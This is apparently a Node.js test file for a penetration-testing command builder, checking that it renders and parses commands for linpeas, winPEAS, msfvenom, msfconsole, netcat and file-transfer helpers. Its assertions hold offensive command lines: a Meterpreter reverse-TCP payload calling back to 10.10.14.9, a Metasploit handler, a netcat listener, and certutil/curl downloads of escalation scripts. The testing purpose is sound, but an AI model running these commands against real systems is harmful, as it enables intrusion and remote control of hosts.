'use strict';
// v10.07 — helper tool builders: linpeas/winPEAS, msfvenom/msfconsole,
// nc/Penelope, and common transfer helpers must ship with executable Evidence
// handling and conservative proof boundaries.
const assert=require('assert');
const cp=require('child_process');
const fs=require('fs');
const path=require('path');
const vm=require('vm');
const root=path.join(__dirname,'..');
const read=rel=>fs.readFileSync(path.join(root,rel),'utf8');
function run(rel,ctx){vm.runInContext(read(rel),ctx,{filename:rel});}

const ctx={console,window:null,globalThis:null,document:undefined};ctx.window=ctx;ctx.globalThis=ctx;vm.createContext(ctx);
for(const rel of ['data/tool-builder-schema.js','data/tool-builder-inventory.js','assets/tool-builder-current.js','data/tool-builders.js','data/tool-builders-helper-current.js','assets/tool-builder-evidence-current.js','assets/tool-builder-helper-evidence-current.js','data/current-release.js'])run(rel,ctx);
const schema=ctx.OBOL_TOOL_BUILDER_SCHEMA;
const builder=ctx.OBOL_TOOL_BUILDER;
const helper=ctx.OBOL_HELPER_TOOL_BUILDERS;
const evidence=ctx.OBOL_TOOL_BUILDER_EVIDENCE_CURRENT;
assert(schema&&builder&&helper&&evidence,'helper builders and Evidence owner must load');
assert.strictEqual(helper.builders.length,6,'helper batch must register six schema-driven builders');
for(const id of ['tb-linpeas','tb-winpeas','tb-msfvenom','tb-msfconsole','tb-nc-penelope','tb-file-transfer-helper']){
 const b=schema.get(id);assert(b,'missing builder '+id);
 const errors=Array.from(schema.validateBuilder(b));assert.strictEqual(errors.length,0,'invalid builder '+id+': '+errors.join('; '));
 assert(b.evidence&&b.evidence.proofBoundary,'builder '+id+' must carry proof boundary');
 assert(evidence.profiles[id],'Evidence profile missing for '+id);
}

function command(id,values){return builder.compile(schema.get(id),values,{target:{value:'10.10.10.55',ip:'10.10.10.55'},context:{domain:'corp.local'},workspace:{outputDir:'loot'}});}
assert(command('tb-linpeas',{mode:'serve',listenPort:'8000',serveDir:'.'}).includes('python3 -m http.server 8000'),'linpeas serve command must be minimal');
assert(command('tb-linpeas',{mode:'download',url:'http://10.10.14.9:8000/linpeas.sh',targetPath:'/tmp/linpeas.sh'}).includes('curl -fsSL'),'linpeas download command must use explicit URL and output');
assert(command('tb-winpeas',{mode:'certutil-download',url:'http://10.10.14.9:8000/winPEASx64.exe',targetPath:'C:\\Windows\\Temp\\winPEASx64.exe'}).includes('certutil -urlcache -f'),'winPEAS certutil download command must render');
assert(command('tb-msfvenom',{payload:'windows/x64/meterpreter/reverse_tcp',lhost:'10.10.14.9',lport:'4444',format:'exe',output:'payload.exe'}).includes('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f exe -o payload.exe'),'msfvenom command must include payload callback and output');
assert(command('tb-msfconsole',{mode:'handler',payload:'windows/x64/meterpreter/reverse_tcp',lhost:'10.10.14.9',lport:'4444',exitOnSession:'false'}).includes('exploit/multi/handler'),'msfconsole handler command must configure the handler');
assert(command('tb-nc-penelope',{toolChoice:'nc',lport:'4444'}).includes('nc -lvnp 4444'),'nc listener command must be minimal');
assert(command('tb-file-transfer-helper',{method:'impacket-smbserver',shareName:'share',serveDir:'.',smb2:true}).includes('impacket-smbserver share . -smb2support'),'SMB transfer helper must render');
assert.throws(()=>command('tb-msfvenom',{payload:'windows/x64/meterpreter/reverse_tcp',lport:'4444',format:'exe',output:'payload.exe'}),/Missing required fields/,'missing LHOST must block fake runnable payload commands');

const inv=ctx.OBOL_TOOL_BUILDER_INVENTORY;
for(const [tool,id] of Object.entries({linpeas:'tb-linpeas',winpeas:'tb-winpeas',msfvenom:'tb-msfvenom',msfconsole:'tb-msfconsole',nc:'tb-nc-penelope',penelope:'tb-nc-penelope',wget:'tb-file-transfer-helper',certutil:'tb-file-transfer-helper','impacket-smbserver':'tb-file-transfer-helper'})){
 const rec=inv.get(tool);assert(rec&&rec.status==='implemented'&&rec.queueItem===id,'inventory should promote '+tool+' to '+id);
}

function facts(id,text){const r=evidence.analyzeForBuilder(id,text);return r&&r.outcomeFacts||[];}
assert(facts('tb-linpeas','linpeas.sh Interesting writable path found under /opt and sudo version warning').includes('privesc.enumeration_leads_observed'),'linpeas output should create enumeration leads');
assert(!facts('tb-linpeas','linpeas.sh Interesting writable path found under /opt').includes('privesc.root_observed'),'linpeas leads must not become root proof');
assert(facts('tb-msfconsole','Started reverse TCP handler on 10.10.14.9:4444').includes('listener.ready_observed'),'handler ready output must be recognized');
assert(facts('tb-msfconsole','Meterpreter session 1 opened').includes('session.callback_observed'),'session callback output must be recognized');
assert(facts('tb-nc-penelope','listening on [any] 4444 ... connect to [10.10.14.9] from target').includes('session.callback_observed'),'listener connection must be recognized');
assert(facts('tb-file-transfer-helper','GET /payload.exe HTTP/1.1 200 - saved 100% sha256 hash match').includes('transfer.integrity_observed'),'transfer integrity output must be recognized');
assert(facts('tb-msfvenom','Payload size: 510 bytes Final size of exe file: 73802 bytes Saved as: payload.exe').includes('payload.artifact_generated_observed'),'payload generation output must be recognized');

const rv=String(ctx.OBOL_CURRENT_RELEASE.version).split('.').map(Number);
assert(rv[0]>10||(rv[0]===10&&(rv[1]>0||(rv[1]===0&&rv[2]>=7))),'current release must be v10.07 or later');
const readme=read('README.md');
assert(/Current release: \*\*v10\.0[78]\*\*/.test(readme),'README current release must remain at v10.07 or later');
assert(!readme.includes('Shell, payload, privesc, and transfer helper batch. Implement linpeas'),'README active Tool Builder queue must not retain completed helper batch as item 1');
const queueDoc=read('docs/TOOL-BUILDER-BUILD-QUEUE.md');
assert(!queueDoc.includes('## Shell, payload, privesc, and transfer helper batch'),'canonical Tool Builder queue must remove completed helper batch');
const auditClosed=queueDoc.includes('No active Tool Builder implementation batches remain')||readme.includes('final implemented-tool Evidence and cross-surface audit closed in v10.08');
if(auditClosed){
 assert(readme.includes('No active Tool Builder implementation batches remain'),'README must say the Tool Builder backlog is closed once the audit lands');
}else{
 assert(readme.includes('Implemented-tool Evidence and cross-surface audit'),'README active Tool Builder queue must advance to the audit batch before it closes');
 assert(queueDoc.includes('## Implemented-tool Evidence and cross-surface audit'),'canonical Tool Builder queue must retain the next unfinished batch before it closes');
}
const release=cp.spawnSync(process.execPath,['tools/validate-release-pr.js','--repo-only'],{cwd:root,encoding:'utf8'});
if(release.status!==0){process.stdout.write(release.stdout||'');process.stderr.write(release.stderr||'');process.exit(release.status||1);}
process.stdout.write(release.stdout||'');
console.log('v10.07 helper builders, Evidence ingestion, inventory promotion, and README queue handoff passed.');
